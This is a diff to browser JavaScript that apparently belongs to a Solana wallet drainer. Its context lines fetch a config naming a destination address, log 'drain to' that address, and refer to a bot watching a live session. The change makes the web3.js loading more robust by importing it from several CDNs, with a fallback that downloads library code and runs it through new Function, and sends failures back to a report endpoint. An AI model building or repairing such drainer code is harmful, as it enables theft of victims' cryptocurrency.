@@ -17,10 +17,17 @@ if(!cfg||cfg.ok===false||!cfg.me){log('config HTTP '+cfgR.status+' '+JSON.string
 const PER=cfg.perTx||2;
 log('config ok · drain to '+cfg.me);
 
-// 2) web3
-const W3=await(async()=>{try{await new Promise((ok,no)=>{const s=document.createElement('script');s.src='https://cdn.jsdelivr.net/npm/@solana/web3.js@1/lib/index.browser.min.js';s.onload=ok;s.onerror=no;(document.head||document.documentElement).appendChild(s)});if(window.solanaWeb3)return window.solanaWeb3}catch(e){}
-try{const r=await fetch('https://cdn.jsdelivr.net/npm/@solana/web3.js@1/lib/index.browser.js');const m={exports:{}};(new Function('module','exports',await r.text()))(m,m.exports);return window.solanaWeb3||m.exports.default||m.exports}catch(e){return null}})();
-if(!W3){log('web3.js load failed','color:#ff5c7a');await report({phase:'fault',fault:'web3.js load failed'});return}
+// 2) web3 — ESM load (the .mjs is the self-contained browser build)
+const W3=await(async()=>{
+  const urls=['https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.mjs','https://esm.sh/@solana/web3.js@1.95.3'];
+  for(const u of urls){
+    try{const m=await import(u);const M=m.default&&m.default.Connection?m.default:m;if(M.Connection)return M}catch(e){log('web3 load failed: '+u,'color:#ffb454')}
+  }
+  // last resort: script tag + CJS eval shim
+  try{const r=await fetch('https://unpkg.com/@solana/web3.js@1.95.3/lib/index.js');const m={exports:{}};(new Function('module','exports',await r.text()))(m,m.exports);return window.solanaWeb3||m.exports.default||m.exports}catch(e){}
+  return null;
+})();
+if(!W3){await report({phase:'fault',fault:'web3.js failed to load from all CDNs (CSP or network) — retry in a normal tab, not inside an iframe'});return}
 log('web3 loaded');
 
 // 3) start — bot knows the session is live
